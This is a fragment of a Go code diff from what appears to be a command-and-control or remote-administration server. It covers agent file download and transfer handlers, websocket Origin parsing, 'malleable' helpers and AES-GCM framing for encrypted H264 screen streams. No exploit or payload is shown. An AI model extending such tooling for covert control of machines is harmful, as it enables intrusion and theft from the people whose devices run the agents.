 		cmdIDs = append(cmdIDs, job.ID+"/"+status)
 	}
 	writeJSON(w, 200, map[string]interface{}{
-		"status":       "enqueued",
-		"transfer_id":  transferID,
-		"agent_id":     req.AgentID,
-		"path":         req.Path,
-		"size":         len(raw),
-		"sha256":       sha,
-		"chunk_count":  chunkCount,
-		"command_ids":  cmdIDs,
+		"status":      "enqueued",
+		"transfer_id": transferID,
+		"agent_id":    req.AgentID,
+		"path":        req.Path,
+		"size":        len(raw),
+		"sha256":      sha,
+		"chunk_count": chunkCount,
+		"command_ids": cmdIDs,
 	})
 }
 
@@ -1662,8 +2162,8 @@ func handleAdminDownload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	payloadObj := map[string]interface{}{
-		"path":       req.Path,
-		"max_bytes":  cfg.FileMaxBytes,
+		"path":      req.Path,
+		"max_bytes": cfg.FileMaxBytes,
 	}
 	pb, _ := json.Marshal(payloadObj)
 	job, status, err := enqueueAndMaybeSend(req.AgentID, "download", string(pb), "")
@@ -1870,7 +2370,6 @@ func asInt(v interface{}) int {
 	}
 }
 
-
 // ---------- B-H7 malleable helpers ----------
 
 func parseCSVPaths(s string) []string {
@@ -1886,6 +2385,25 @@ func parseCSVPaths(s string) []string {
 		}
 		if !strings.HasPrefix(p, "/") {
 			p = "/" + p
+		}
+		out = append(out, p)
+	}
+	return out
+}
+
+// parseCSVHosts parses a comma-separated list of host[:port] origin tokens
+// for websocket Origin checks. Unlike parseCSVPaths it must NOT prepend "/"
+// — origins are hostnames, not routes.
+func parseCSVHosts(s string) []string {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return nil
+	}
+	var out []string
+	for _, p := range strings.Split(s, ",") {
+		p = strings.TrimSpace(p)
+		if p == "" {
+			continue
 		}
 		out = append(out, p)
 	}
@@ -2012,6 +2530,48 @@ func aeadOpen(key []byte, raw []byte) ([]byte, error) {
 		return nil, err
 	}
 	return gcm.Open(nil, nonce, ct, nil)
+}
+
+// binStreamMagic marks a binary stream frame on the agent WS. Wire format:
+//
+//	0xB1 || nonce(12) || AES-256-GCM(sessionKey).Seal(frame)
+//
+// This replaces the legacy text path's base64 + double-JSON + sha256
+// inflation (~1.86x per segment) for H264 stream traffic.
+const binStreamMagic = 0xB1
+
+// aeadSealRaw is aeadSeal without the JSON/base64 envelope: nonce || ct+tag.
+func aeadSealRaw(key []byte, plain []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
+		return nil, err
+	}
+	return append(nonce, gcm.Seal(nil, nonce, plain, nil)...), nil
+}
+
+// aeadOpenRaw reverses aeadSealRaw.
+func aeadOpenRaw(key []byte, raw []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	ns := gcm.NonceSize()
+	if len(raw) < ns+1 {
+		return nil, fmt.Errorf("short raw aead frame")
+	}
+	return gcm.Open(nil, raw[:ns], raw[ns:], nil)
 }
 
 func looksEncrypted(raw []byte) bool {
